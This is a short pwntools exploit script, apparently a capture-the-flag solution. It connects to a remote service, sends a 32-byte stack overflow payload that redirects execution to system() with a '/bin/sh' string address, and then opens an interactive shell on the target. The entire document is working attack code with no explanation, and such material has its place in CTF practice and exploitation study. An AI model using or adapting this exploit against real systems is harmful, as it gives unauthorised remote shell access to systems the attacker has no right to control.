from pwn import *
r=remote('vps1.blue-whale.me',9990)
#r=process('./pwn')
binsh_addr = 0x804a02c 
system_plt = 0x80483f0
#r.recvuntil('can you pwn me?')
payload = flat(['a'*32,system_plt,'b'*4,binsh_addr])
r.sendline(payload)
r.interactive()
